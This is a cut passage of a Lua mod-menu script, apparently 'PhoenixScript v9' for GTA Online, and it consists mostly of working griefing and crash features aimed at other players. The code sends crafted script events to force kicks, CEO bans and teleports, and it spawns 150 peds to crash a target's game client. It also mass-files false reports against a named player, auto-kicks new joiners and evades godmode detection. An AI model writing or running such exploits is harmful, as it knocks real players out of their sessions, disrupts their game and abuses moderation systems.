	PED.SET_PED_RELATIONSHIP_GROUP_HASH(player_ped, util.joaat("PLAYER"))

	local heli_hash = util.joaat("buzzard2")
	local ped_hash = util.joaat("s_m_y_blackops_01")
	STREAMING.REQUEST_MODEL(ped_hash)
	STREAMING.REQUEST_MODEL(heli_hash)
	while not STREAMING.HAS_MODEL_LOADED(ped_hash) or not STREAMING.HAS_MODEL_LOADED(heli_hash) do
		util.yield()
	end
	local heli = util.create_vehicle(heli_hash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
	buzzard_entities[#buzzard_entities + 1] = heli
	
	if not collision then
		VEHICLE._DISABLE_VEHICLE_WORLD_COLLISION(heli)
	end
	
	ENTITY.SET_ENTITY_INVINCIBLE(heli, buzzard_godmode)
	ENTITY.SET_ENTITY_VISIBLE(heli, buzzard_visible, 0)	
	VEHICLE.SET_VEHICLE_ENGINE_ON(heli, true, true, true)
	VEHICLE.SET_HELI_BLADES_FULL_SPEED(heli)
		
	local pilot = util.create_ped(5, ped_hash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
	buzzard_entities[#buzzard_entities + 1] = pilot
	
	PED.SET_PED_RELATIONSHIP_GROUP_HASH(pilot, util.joaat("ARMY"))
	ENTITY.SET_ENTITY_VISIBLE(pilot, buzzard_visible, 0)
	PED.SET_PED_INTO_VEHICLE(pilot, heli, -1)
	PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(pilot, true)

	PED.SET_PED_MAX_HEALTH(pilot, 500)
	ENTITY.SET_ENTITY_HEALTH(pilot, 500)
	ENTITY.SET_ENTITY_INVINCIBLE(pilot, buzzard_godmode)
	--TASK.TASK_COMBAT_HATED_TARGETS_AROUND_PED(pilot, 500, 0)

	local gunner = {}
	for i  = 1,2 do
		gunner[i] = util.create_ped(29, ped_hash, pos, CAM.GET_GAMEPLAY_CAM_ROT(0).z)
		buzzard_entities[#buzzard_entities + 1] = gunner[i]
		PED.SET_PED_INTO_VEHICLE(gunner[i], heli, i)
		WEAPON.GIVE_WEAPON_TO_PED(gunner[i], util.joaat(gunner_weapon) , 9999, false, true)
		PED.SET_PED_COMBAT_ATTRIBUTES(gunner[i], 20 --[[ they can shoot from vehicle ]], true)
		--PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(gunner[i], true)
		PED.SET_PED_MAX_HEALTH(gunner[i], 500)
		ENTITY.SET_ENTITY_HEALTH(gunner[i], 500)
		ENTITY.SET_ENTITY_INVINCIBLE(gunner[i], buzzard_godmode)
		ENTITY.SET_ENTITY_VISIBLE(gunner[i], buzzard_visible, 0)
		PED.SET_PED_SHOOT_RATE(gunner[i], 1000)
		PED.SET_PED_RELATIONSHIP_GROUP_HASH(gunner[i], util.joaat("ARMY"))
		TASK.TASK_COMBAT_HATED_TARGETS_AROUND_PED(gunner[i], 1000, 0)
	end
	
	util.create_tick_handler(function()
		PED.SET_RELATIONSHIP_BETWEEN_GROUPS(5, util.joaat("ARMY"), util.joaat("PLAYER"))
		PED.SET_RELATIONSHIP_BETWEEN_GROUPS(5, util.joaat("PLAYER"), util.joaat("ARMY"))
		PED.SET_RELATIONSHIP_BETWEEN_GROUPS(0, util.joaat("ARMY"), util.joaat("ARMY"))
	end)

	notification("Buzzard sent to "..PLAYER.GET_PLAYER_NAME(pid), true, true)
	return pilot, heli
end	

	local buzzard_options = menu.list(griefing, "Enemy Buzzard", {}, "")

	menu.divider(buzzard_options, "Enemy Buzzard")

	buzzard_visible = true
	local gunner_weapon = "weapon_combatmg"
	
	menu.action(buzzard_options, "Spawn Buzzard", {}, "", function()
		local pilot, heli = spawn_buzzard(pid, gunner_weapon, collision)

		while ENTITY.GET_ENTITY_HEALTH(pilot) > 0 do
			local player_ped = PLAYER.GET_PLAYER_PED(pid)
			local a = ENTITY.GET_ENTITY_COORDS(player_ped)
			local b = ENTITY.GET_ENTITY_COORDS(heli)
			if MISC.GET_DISTANCE_BETWEEN_COORDS(a.x, a.y, a.z, b.x, b.y, b.z, true) > 90 then
				TASK.TASK_HELI_CHASE(pilot, player_ped, 0, 0, 50)
			else
				TASK.TASK_HELI_MISSION(pilot, heli, 0, player_ped, a.x, a.y, a.z, 23, 30, -1, -1, 10, 10, 5, 0)
			end
			util.yield()
		end
	end)

	menu.divider(buzzard_options, "Settings")

	menu.toggle(buzzard_options, "Invincible", {}, "", function(on)
		buzzard_godmode = on
	end, false)
	
	local menu_gunner_weapon_list = menu.list(buzzard_options, "Gunners Weapon")
	menu.divider(menu_gunner_weapon_list, "Gunner Weapon List")

	for i = 1, #gunner_weapon_list do
		menu.action(menu_gunner_weapon_list, gunner_weapon_list[i][1], {}, "", function()
			gunner_weapon = gunner_weapon_list[i][2]
			notification("[WiriScript] Now gunners will shoot with "..gunner_weapon_list[i][1].."s")
		end)
	end

	menu.toggle(buzzard_options, "Visible", {}, "You shouldn't be that toxic to turn this off", function(on)
		buzzard_visible = on
	end, true)

	menu.toggle(buzzard_options, "Collision", {}, "When it's turned off disables world collision for Buzzard. Playes can still destroy the vehicle", function(on)
		collision = on
	end, false)

	menu.action(buzzard_options, "Delete All", {}, "Deletes all Buzzards you've spawned", function()
		for key, value in pairs(buzzard_entities) do
			util.delete_entity(value)
		end
	end)
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

	menu.action(griefing,"Spawn Attacker Tank", {}, "", function()
		V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

        hash = util.joaat("rhino")
        ped_hash = util.joaat("MP_M_Cocaine_01")

        if STREAMING.IS_MODEL_A_VEHICLE(hash) then
            STREAMING.REQUEST_MODEL(hash)

            while not STREAMING.HAS_MODEL_LOADED(hash) do

                util.yield()
            end

            aab = v3()
            aab = player.get_player_coords(pid)
            aab.x = -5784.258301
            aab.y = -8289.385742
            aab.z = -136.411270

            ENTITY.SET_ENTITY_VISIBLE(ped_to_kidnap, false)
            ENTITY.FREEZE_ENTITY_POSITION(ped_to_kidnap, false)

            table_kidnap[veh_to_attach] = util.create_vehicle(hash, ENTITY.GET_ENTITY_COORDS(V3, true),
                                              CAM.GET_FINAL_RENDERED_CAM_ROT(0).z)
            while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
                STREAMING.REQUEST_MODEL(ped_hash)
                util.yield()
            end
            ped_to_kidnap = util.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
            ped_to_drive = util.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)

            ENTITY.SET_ENTITY_INVINCIBLE(table_kidnap[veh_to_attach], true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(table_kidnap[veh_to_attach], ped_to_kidnap, 0, 0, 1, -1, 0, 0, 0, false,
                true, true, false, 0, false)

            coords_ped = v3()
            coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)
            coords_ped.x = coords_ped.x + math.random(-20, 20)
            coords_ped.y = coords_ped.y + math.random(-20, 20)
            coords_ped.z = coords_ped.z

            ENTITY.SET_ENTITY_COORDS(ped_to_kidnap, coords_ped.x, coords_ped.y, coords_ped.z, false, false, false, false)
            PED.SET_PED_INTO_VEHICLE(ped_to_drive, table_kidnap[veh_to_attach], -1)

            VEHICLE.SET_VEHICLE_ENGINE_ON(table_kidnap[veh_to_attach], true, true, false)
            TASK.TASK_VEHICLE_SHOOT_AT_PED(ped_to_drive, V3, 1)
            TASK.TASK_VEHICLE_CHASE(ped_to_drive, V3)

            util.yield(1)
            delet_entity(ped_to_kidnap)
            veh_to_attach = veh_to_attach + 1

            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)

            --util.toast(os.date("%H:%M:%S") .. " DONE", TOAST_ABOVE_MAP)
        end
	end)

	menu.action(griefing,"Kidnap Player", {}, "", function()
		V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

        hash = util.joaat("stockade")
        ped_hash = util.joaat("MP_M_Cocaine_01")

        if STREAMING.IS_MODEL_A_VEHICLE(hash) then
            STREAMING.REQUEST_MODEL(hash)

            while not STREAMING.HAS_MODEL_LOADED(hash) do
                util.yield()
            end

            coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)

            aab = v3()
            aab = player.get_player_coords(pid)
            aab.x = -5784.258301
            aab.y = -8289.385742
            aab.z = -136.411270

            ENTITY.SET_ENTITY_VISIBLE(ped_to_kidnap, false)
            ENTITY.FREEZE_ENTITY_POSITION(ped_to_kidnap, true)

            table_kidnap[veh_to_attach] = util.create_vehicle(hash, ENTITY.GET_ENTITY_COORDS(V3, true),
                                              CAM.GET_FINAL_RENDERED_CAM_ROT(0).z)
            while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
                STREAMING.REQUEST_MODEL(ped_hash)
                util.yield()
            end
            ped_to_kidnap = util.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
            ped_to_drive = util.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)

            ENTITY.SET_ENTITY_INVINCIBLE(ped_to_drive, true)
            ENTITY.SET_ENTITY_INVINCIBLE(table_kidnap[veh_to_attach], true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(table_kidnap[veh_to_attach], ped_to_kidnap, 0, 0, 1, -1, 0, 0, 0, false,
                true, true, false, 0, false)
            ENTITY.SET_ENTITY_COORDS(ped_to_kidnap, coords_ped.x, coords_ped.y, coords_ped.z - 1, false, false, false,
                false)
            PED.SET_PED_INTO_VEHICLE(ped_to_drive, table_kidnap[veh_to_attach], -1)
            TASK.TASK_VEHICLE_DRIVE_WANDER(ped_to_drive, table_kidnap[veh_to_attach], 20, 16777216)

            util.yield(500)

            delet_entity(ped_to_kidnap)
            veh_to_attach = veh_to_attach + 1

            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)

            --util.toast(os.date("%H:%M:%S") .. " DONE", TOAST_ABOVE_MAP)

        end
	end)

	menu.action(griefing,"Deliver Player to you", {"deliver"}, "Kidnaps the target and brings them to your current location", function()
		V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

        hash = util.joaat("stockade")
        ped_hash = util.joaat("MP_M_Cocaine_01")

        if STREAMING.IS_MODEL_A_VEHICLE(hash) then
            STREAMING.REQUEST_MODEL(hash)

            while not STREAMING.HAS_MODEL_LOADED(hash) do
                util.yield()
            end

            coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)

            aab = v3()
            aab = player.get_player_coords(pid)
            aab.x = -5784.258301
            aab.y = -8289.385742
            aab.z = -136.411270

            ENTITY.SET_ENTITY_VISIBLE(ped_to_kidnap, false)
            ENTITY.FREEZE_ENTITY_POSITION(ped_to_kidnap, true)

            table_kidnap[veh_to_attach] = util.create_vehicle(hash, ENTITY.GET_ENTITY_COORDS(V3, true),
            CAM.GET_FINAL_RENDERED_CAM_ROT(0).z)
            while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
                STREAMING.REQUEST_MODEL(ped_hash)
                util.yield()
            end
            ped_to_kidnap = util.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
            ped_to_drive = util.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
			local PlayerPed = PLAYER.GET_PLAYER_PED(players.user())
			local PedCoords = ENTITY.GET_ENTITY_COORDS(PlayerPed)
            ENTITY.SET_ENTITY_INVINCIBLE(ped_to_drive, true)
            ENTITY.SET_ENTITY_INVINCIBLE(table_kidnap[veh_to_attach], true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(table_kidnap[veh_to_attach], ped_to_kidnap, 0, 0, 1, -1, 0, 0, 0, false,
                true, true, false, 0, false)
            ENTITY.SET_ENTITY_COORDS(ped_to_kidnap, coords_ped.x, coords_ped.y, coords_ped.z - 1, false, false, false,
                false)
            PED.SET_PED_INTO_VEHICLE(ped_to_drive, table_kidnap[veh_to_attach], -1)
            --TASK.TASK_VEHICLE_DRIVE_WANDER(ped_to_drive, table_kidnap[veh_to_attach], 20, 16777216)
			TASK.TASK_VEHICLE_DRIVE_TO_COORD(ped_to_drive, table_kidnap[veh_to_attach], PedCoords.x, PedCoords.y, PedCoords.z, 30, 1, hash, 4, 5, 0)

            util.yield(500)

            delet_entity(ped_to_kidnap)
            veh_to_attach = veh_to_attach + 1

            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)

            --util.toast(os.date("%H:%M:%S") .. " DONE", TOAST_ABOVE_MAP)

        end
	end)

	menu.action(griefing,"Vehicle Kick (fixed)", {}, "", function()
		local ped = PLAYER.GET_PLAYER_PED(pid)
		TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped) 
		util.trigger_script_event(1 << pid, {-1005623606, 0, 30583, 0, 0, 0, 1061578342, 1061578342, 4})
	end)

	--[[menu.action(griefing,"Give 5 Stars", {}, "", function()
		PLAYER.SET_PLAYER_WANTED_LEVEL(pid, 5, false)
		PLAYER.SET_PLAYER_WANTED_LEVEL_NOW(pid, false)
	end)]]

	menu.action(griefing,"CEO Ban (fixed)", {}, "", function()
		util.trigger_script_event(1 << pid, {1355230914, 0, 1, 5, 0})
	end)

	menu.action(griefing,"CEO Dismiss (fixed)", {}, "", function() 
		util.trigger_script_event(1 << pid, {-316948135, 0, 1, 5})
	end)

	menu.action(griefing,"CEO Terminate (broken)", {}, "", function()
		util.trigger_script_event(1 << pid, {0x9DB77399, 1, 1, 6})
		util.trigger_script_event(1 << pid, {0x9DB77399, 0, 1, 6, 0})
	end)

	--[[menu.toggle(main,"Invalid Event Spam", {}, "", function(v)
		EventSpam(pid)
	end)]]

	menu.action(griefing,"Apartment Invite (fixed)", {}, "", function()
		if pid ~= players.user() then
			arg = math.random(-2147483647, 2147483647)
			util.trigger_script_event(1 << pid, {1249026189, arg, pid, -1, 1, -1, 1, 1, 1})
			util.trigger_script_event(1 << pid, {1249026189, 24, 24, 1, 0, arg, 1, 1, 1})
			util.trigger_script_event(1 << pid, {1249026189, 24, 24, 1, 0, arg, 1, 1, 1})
		end
	end)

	menu.action(griefing,"Send to Mission (fixed)", {}, "", function()
		if pid ~= players.user() then
			send_script_event(-1147284669, pid, args(pid))
			send_script_event(-1147284669, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
			send_script_event(-1147284669, pid, args(pid))
			send_script_event(-1147284669, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
			send_script_event(-1147284669, pid, args(pid))
			send_script_event(-1147284669, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
			send_script_event(-1147284669, pid, args(pid))
			send_script_event(-1147284669, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
			send_script_event(-1147284669, pid, args(pid))
			send_script_event(-1147284669, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
			send_script_event(-1147284669, pid, args(pid))
			send_script_event(-1147284669, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
		end
	end)

	menu.action(griefing,"Send to Island (fixed)", {}, "", function()
		if pid ~= players.user() then
			send_script_event(-1479371259, pid, {pid, -1479371259, 0, 0})
			send_script_event(-1479371259, pid, args(pid))
			send_script_event(-1479371259, pid, {pid, -1479371259, 0, 0})
			send_script_event(-1479371259, pid, args(pid))
			send_script_event(-1479371259, pid, {pid, -1479371259, 0, 0})
			send_script_event(-1479371259, pid, args(pid))
			send_script_event(-1479371259, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
			send_script_event(-1479371259, pid, args(pid))
			send_script_event(-1479371259, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
			send_script_event(-1479371259, pid, args(pid))
			send_script_event(-1479371259, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
			send_script_event(-1479371259, pid, args(pid))
			send_script_event(-1479371259, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
			send_script_event(-1479371259, pid, args(pid))
			send_script_event(-1479371259, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
			send_script_event(-1479371259, pid, args(pid))
			send_script_event(-1479371259, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
		end
	end)

	menu.action(griefing,"Insurance Error (broken)", {}, "", function()
		if pid ~= players.user() then
			send_script_event(1302185744, pid, args(pid))
			send_script_event(1302185744, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
			send_script_event(891272013, pid, args(pid))
			send_script_event(891272013, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
			send_script_event(1302185744, pid, args(pid))
			send_script_event(1302185744, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
			send_script_event(891272013, pid, args(pid))
			send_script_event(891272013, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
			send_script_event(1302185744, pid, args(pid))
			send_script_event(1302185744, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
			send_script_event(891272013, pid, args(pid))
			send_script_event(891272013, pid, {100101, -1010001, 100000, 100, 10000, -10000, -100, 5555, -5555})
		end
	end)

	menu.action(griefing,"Ban Voice Chat", {}, "May lag your game when in progress", function()
		if pid ~= players.user() then
			for i = 1, 30 do
				menu.trigger_commands("reportvcannoying " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportvchate " .. PLAYER.GET_PLAYER_NAME(pid))
				util.yield(3)
			end
		end
	end)

	menu.action(griefing,"Report Spam", {}, "May lag your game when in progress", function()
		if pid ~= players.user() then
			for i = 1, 50 do
				menu.trigger_commands("reportvcannoying " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportvchate " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportannoying " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reporthate " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportexploits " .. PLAYER.GET_PLAYER_NAME(pid))
				menu.trigger_commands("reportbugabuse " .. PLAYER.GET_PLAYER_NAME(pid))
				util.yield(3)
			end
		end
	end)

	passivemode = menu.list(griefing, "Passive Mode (broken)", {}, "", function(); end)

	menu.action(passivemode,"Block (broken)", {}, "", function()
		if players.exists(pid) then -- skidded from 2take1script cuz why not lol
			send_script_event(-909357184, pid, {pid, 1})
			send_script_event(-909357184, pid, {pid, 1})
		end
	end)

	menu.action(passivemode,"Unblock (broken)", {}, "", function()
		if players.exists(pid) then
			send_script_event(-909357184, pid, {pid, 0})
			send_script_event(-909357184, pid, {pid, 0})
		end
	end)







	standkicks = menu.list(crashevents, "Stand's kicks", {}, "For redundancy", function(); end)
	
	menu.action(standkicks, "Smart Kick", {}, "Stand's 'Smart kick'", function()
		menu.trigger_commands("kick" .. PLAYER.GET_PLAYER_NAME(pid))
	end)

	menu.action(standkicks, "SE Kick", {}, "Stand's 'Non-Host kick'", function()
		menu.trigger_commands("nonhostkick" .. PLAYER.GET_PLAYER_NAME(pid))
	end)

	menu.action(standkicks, "Desync Kick", {}, "Stand's 'Desync kick'", function()
		menu.trigger_commands("desynckick" .. PLAYER.GET_PLAYER_NAME(pid))
	end)

	menu.action(standkicks, "Host Kick", {}, "Stand's 'Host kick'", function()
		menu.trigger_commands("hostkick" .. PLAYER.GET_PLAYER_NAME(pid))
	end)

	menu.action(standkicks, "Pickup Kick", {}, "Stand's 'Invalid Pickup kick'", function()
		menu.trigger_commands("pickupkick" .. PLAYER.GET_PLAYER_NAME(pid))
	end)

	menu.action(crashevents, "Kick", {}, "", function()
		if pid ~= players.user() and players.exists(pid) then
			KickV1(pid, 2)
			notification("Kick has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
		end
	end)



	menu.action(crashevents,"SE Crash", {}, "Toxic edition restrictions apply", function()
		if pid ~= players.user() and players.exists(pid) then
			Crash(pid)
			notification("Script Event Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
			util.yield(12000)
			if not players.exists(pid) then
				notitication(resolves[math.random(1,4)], false, true)
				notification("Player left", true, false)
			else
				notification("Not resolved :(", false, true)
				notification("Player did not leave, probably the crash got blocked", true, false)
			end
		end
	end)



	menu.action(crashevents, "Last Resort Crash", {"LRCrash"}, "Every time you click this a kid in Africa dies", function()
		if pid ~= players.user() and players.exists(pid) and not crash_in_progress then
			crash_in_progress = true
			pedhash = 0xD266D9D6 -- Wade
			while not STREAMING.HAS_MODEL_LOADED(pedhash) and crash_in_progress do
				STREAMING.REQUEST_MODEL(pedhash)
				util.yield(10)
			end

			menu.trigger_commands("anticrashcamera on")
			notification("Last Resort Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
			local player_ped = PLAYER.GET_PLAYER_PED(pid)
			local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
			local SpawnedPeds = {}
			local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z

			for i = 1, 150 do
				local coords = PlayerPedCoords
				coords.x = coords.x
				coords.y = coords.y
				coords.z = coords.z + 10
				SpawnedPeds[i] = util.create_ped(28, pedhash, coords, FinalRenderedCamRot)
				util.yield(20)
			end
			notification("Done sending", true, true)
			util.yield(3000)
			notification("Cleaning up", true, true)
			for i = 1, 150 do
				delet_entity(SpawnedPeds[i])
				util.yield(25)
			end
			notification("Done cleaning up", true, true)
			util.yield(1500)
			menu.trigger_commands("anticrashcamera off")
			util.yield(7500)
			if not players.exists(pid) then
				notification(resolves[math.random(1,4)], false, true)
				notification("Player left", true, false)
			end
			util.yield(100)
			crash_in_progress = false
		end
		while not crash_in_progress and STREAMING.HAS_MODEL_LOADED(pedhash) do
			STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(pedhash)
			util.yield(10)
		end
		if crash_in_progress then
			notification("You have another crash in progress, please wait", true, true)
		end
	end)

	--[[menu.action(crashevents, "Last Resort Crash (old)", {"LRCrashOld"}, "An older but proven version of the crash if the new ones are ever broken", function()
		if pid ~= players.user() and players.exists(pid) and not crash_in_progress then
			crash_in_progress = true
			--pedhash = 0x7896DA94 -- ron
			--pedhash = 0x5CDEF405 -- fib
			pedhash = 0x45463A0D -- lamar
			while not STREAMING.HAS_MODEL_LOADED(pedhash) do
				STREAMING.REQUEST_MODEL(pedhash)
				util.yield(10)
			end
			menu.trigger_commands("anticrashcamera on")
			notification("Last Resort Crash has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
			local player_ped = PLAYER.GET_PLAYER_PED(pid)
			local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
			local SpawnedPeds = {}
			local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
			for i = 1, 175 do

				local coords = PlayerPedCoords
				coords.x = coords.x
				coords.y = coords.y
				coords.z = coords.z - 5
				SpawnedPeds[i] = util.create_ped(28, pedhash, coords, FinalRenderedCamRot)
				util.yield(20)
			end
			notification("Done sending", true, true)
			util.yield(3000)
			notification("Cleaning up", true, true)
			for i = 1, 175 do
				delet_entity(SpawnedPeds[i])
				util.yield(25)
			end
			notification("Done cleaning up", true, true)
			util.yield(1500)
			menu.trigger_commands("anticrashcamera off")
			util.yield(7500)
			if not players.exists(pid) then
				util.toast(resolves[math.random(1,4)], TOAST_ABOVE_MAP)
				notification("Player left", true, false)
			end
			util.yield(100)
			crash_in_progress = false
		end
		if crash_in_progress then
			notification("You have another crash in progress, please wait", true, true)
		end
	end)]]

end

blockpassivenewjoiners = false
kicknewjoiners = false

if success then
	newjoiners = menu.list(menu.my_root(), "New Joiners", {}, "", function(); end)
	menu.toggle(newjoiners, "Block Passive", {"blockpassivenewjoiners"}, "Sends Block Passive event to every player when you join a session or when they join you", function(on_toggle)
		if on_toggle then
			blockpassivenewjoiners = true
		else
			blockpassivenewjoiners = false
		end
	end, false)

	menu.toggle(newjoiners, "Kick", {"kicknewjoiners"}, "Sends kick to every player when you join a session or when they join you", function(on_toggle)
		if on_toggle then
			kicknewjoiners = true
		else
			kicknewjoiners = false
		end
	end, false)
end

if success then
	misc = menu.list(menu.my_root(), "Miscellaneous", {}, "", function(); end)
	
	
	menu.toggle(misc,"Alternate 'Godmode'", {}, "Sets your max health really high and turns on autoheal. May bypass some menus' godmode detection due to your entity not being truly invincible.", function(on)  
		if on then
        	local me = players.user()   
			local PlayerPed = PLAYER.GET_PLAYER_PED(me)
    		PED.SET_PED_MAX_HEALTH(PlayerPed,  90000)
			menu.trigger_commands("godmode off")
			menu.trigger_commands("demigodmode on")
			menu.trigger_commands("gracefulness on")
        else
			PED.SET_PED_MAX_HEALTH(PlayerPed, 328)
			menu.trigger_commands("demigodmode off")
			notification("you may want to turn normal godmode back on again :)", false, true)
		end
	end)

	menu.action(misc,"Become Monke", {"monke"}, "", function() -- I don't understand, why doesnt this work?
		notification("you are now the king of monkeys", false, true)
			STREAMING.REQUEST_MODEL(0xA8683715)
			STREAMING.REQUEST_MODEL(0xC2D06F53)
			STREAMING.REQUEST_MODEL(0x3656C8C1)

		PLAYER.SET_PLAYER_MODEL(players.user(), 0xC2D06F53)

		local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
		local SpawnedMonkeys = {}
		local player_ped = PLAYER.GET_PLAYER_PED(pid)
		local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
		--local group = PED.CREATE_GROUP()
		--PED.SET_PED_AS_GROUP_LEADER(players.user(), group)   ----- I dont think this group stuff is needed so I commented it out
		
		for i=1, 5 do
			SpawnedMonkeys[i] = util.create_ped(28, 0xA8683715, PlayerPedCoords, FinalRenderedCamRot)
			--PED.SET_PED_AS_GROUP_MEMBER(SpawnedMonkeys[i], group)

			TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(SpawnedMonkeys[i], player_ped, 0, 0, 0, 2.0, -1, 5.0, true)
			WEAPON.GIVE_WEAPON_TO_PED(SpawnedMonkeys[i], 0x3656C8C1, 1, false, true)
			WEAPON.SET_CURRENT_PED_WEAPON(SpawnedMonkeys[i], 0x3656C8C1, true)
			util.yield(10)

			STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(0xA8683715)
			STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(0xC2D06F53)
			STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(0x3656C8C1)

		end
	


	end)

	menu.action(misc,"Fix Casino Heist", {}, "", function()
		STATS.STAT_SET_INT(util.joaat("MP0_H3OPT_POI"), 0, true)
		STATS.STAT_SET_INT(util.joaat("MP0_H3OPT_ACCESSPOINTS"), 0, true)
	end)


	faketype = menu.list(misc, "Fake Type", {}, "", function(); end)

	menu.action(faketype, "Start", {}, "Will show a typing indicator above your nickname and also make other menus think that you're typing in chat", function()
		menu.trigger_commands("hidetyping off")
		for pids = 0, 32 do
			if players.exists(pids) and pids ~= players.user() then
				send_script_event(-1329008922, pids, {players.user(), pids, 2131})
			end
		end
	end)

	menu.action(faketype, "Stop", {}, "", function()
		for pids = 0, 32 do
			if players.exists(pids) and pids ~= players.user() then
				send_script_event(1841943281, pids, {players.user(), pids, 2131})
			end
		end
		menu.trigger_commands("hidetyping on")
	end)

	menu.toggle(faketype, "Anti-Type", {}, "AKA 'Suppress Typing Indicator', hides the fact that you're typing", function(on)
		if on then
			menu.trigger_commands("hidetyping on")
		else
			menu.trigger_commands("hidetyping off")
		end
	end)


end



if success then
	notification("PhoenixScript v9 has been successfully loaded!", true, true)
end




if success then
	local InitialPlayersList = players.list(true, true, true) -- Obtain list of players from Stand API
	for i=1, #InitialPlayersList do -- Loop through the received player list
    	GenerateFeatures(InitialPlayersList[i]) -- Generate Features for every player
	end
	InitialPlayersList = nil -- Discard the table as it is no longer needed (optional; most beginners will not do this)

	players.on_join(function(pid)
		if blockpassivenewjoiners then
			for i = 1, 5 do
				if pid ~= players.user() then
					util.yield(90000)
					util.trigger_script_event(1 << pid, {-909357184, pid, 1})
					util.trigger_script_event(1 << pid, {-909357184, pid, 1})
				end
			end
			if players.exists(pid) then
				notification("Block Passive has been automatically sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, false)
			end
		end

		if kicknewjoiners then
			if pids ~= players.user() and players.exists(pid) then
				
				if players.user() == players.get_host() then
					notification("Host Kick has been automatically sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
					menu.trigger_commands("hostkick " .. PLAYER.GET_PLAYER_NAME(pids))
				else
					util.yield(90000)

					KickV1(pids, 2)
					notification("Kick has been automatically sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
				end
				util.yield()
			end
		end

		-- put any more functions for new joiners here






	end)
	players.on_join(GenerateFeatures)
	players.on_leave(update_leave)
	players.on_join(update_join)
	--util.on_stop(cleanup)
end





local last_call_time = util.current_time_millis()
local redo_boost = false
if success then
	while true do
		
		
		--for vehicle chaos
		if (chaos) then
			vehicles = util.get_all_vehicles()
			cur_players = players.list(true,true,true)
			for k,v in pairs(vehicles) do
				driver = VEHICLE.GET_PED_IN_VEHICLE_SEAT(v, -1)
				if(PED.GET_PED_TYPE(driver) > 4) then
					VEHICLE.SET_VEHICLE_OUT_OF_CONTROL(v, false, true)
					VEHICLE.SET_VEHICLE_FORWARD_SPEED(v, speed)
					VEHICLE.SET_VEHICLE_GRAVITY(v, gravity)
				end
			end
